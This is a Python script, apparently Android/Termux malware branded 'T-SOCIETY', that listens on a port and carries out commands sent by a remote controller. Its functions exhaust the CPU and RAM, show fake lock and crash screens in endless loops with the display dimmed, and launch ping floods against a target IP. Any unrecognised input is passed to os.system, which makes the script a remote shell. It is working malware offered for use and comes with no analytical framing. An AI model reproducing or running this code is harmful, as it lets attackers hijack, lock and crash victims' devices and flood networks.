import socket
import argparse
import os
import threading
import multiprocessing
import time

# 💣 CPU PATLAT
def killall():
    def overload():
        while True:
            x = 9999999999999999 ** 999999999999999
    for _ in range(multiprocessing.cpu_count() * 10):
        threading.Thread(target=overload).start()

# 🔥 RAM PATLAT
def coker():
    def yükle_ram():
        a = []
        try:
            while True:
                a.append("█" * 10**6)
        except:
            pass
    for _ in range(20):
        threading.Thread(target=yükle_ram).start()

# 🔒 T-SOCIETY KİLİT
def kilit():
    os.system("termux-toast -s '🔒 T-SOCIETY kilidi etkin'")
    os.system("termux-brightness 0")
    img_url = "https://i.ibb.co/rST0vhS/file-000000001b346246a600d1f6fcfd6f02.png"
    os.system(f"am start -a android.intent.action.VIEW -d '{img_url}'")
    while True:
        os.system('termux-dialog -t "📴 T-SOCIETY KİLİDİ" -i "Bu cihaz kilitlendi. Yeniden başlatmadan çıkamazsın."')
        time.sleep(0.5)

# 📡 Wi-Fi Saldırı (root'suz)
def wifi_saldir(ip):
    os.system("termux-toast -s '📡 Wi-Fi çökertme (ping)'")
    os.system(f"ping -s 65000 -i 0.1 {ip}")

# 🔥 Wi-Fi Flood (root'lu)
def wifi_coker_root(ip):
    os.system("termux-toast -s '🔥 Wi-Fi ROOT saldırısı başlatıldı'")
    os.system(f"su -c 'ping -f -s 65000 {ip}'")

# 💀 ANLIK ÇÖKERTME
def anlik_cokert():
    os.system("termux-brightness 0")
    os.system("termux-toast -s '💥 Sistem hatası oluştu'")
    os.system("am start -a android.intent.action.VIEW -d 'https://i.ibb.co/3zGQgjp/fake-crash.png'")
    while True:
        os.system('termux-dialog -t "💥 Sistem Çökmesi" -i "Bellek hatası. Sistem tepki vermiyor."')
        time.sleep(1)

# 🔌 Port ayarı
parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", type=int, required=True)
args = parser.parse_args()
port = args.port

host = "0.0.0.0"
s = socket.socket()
s.bind((host, port))
s.listen(1)

print(f"[+] Dinleniyor: {host}:{port}")
conn, addr = s.accept()
print(f"[✓] Bağlandı: {addr[0]}:{addr[1]}")

# 🎯 Komutlar
while True:
    veri = conn.recv(1024).decode()
    if not veri:
        break
    print(f"[🧨] Komut: {veri}")

    if veri == "killall":
        killall()
    elif veri == "coker":
        coker()
    elif veri == "kilit":
        kilit()
    elif veri == "cokus":
        anlik_cokert()
    elif veri.startswith("wifi:"):
        ip = veri.split(":")[1]
        wifi_saldir(ip)
    elif veri.startswith("wifiroot:"):
        ip = veri.split(":")[1]
        wifi_coker_root(ip)
    elif veri == "exit":
        print("[x] Bağlantı kapatıldı.")
        break
    else:
        os.system(veri)

conn.close()
s.close()
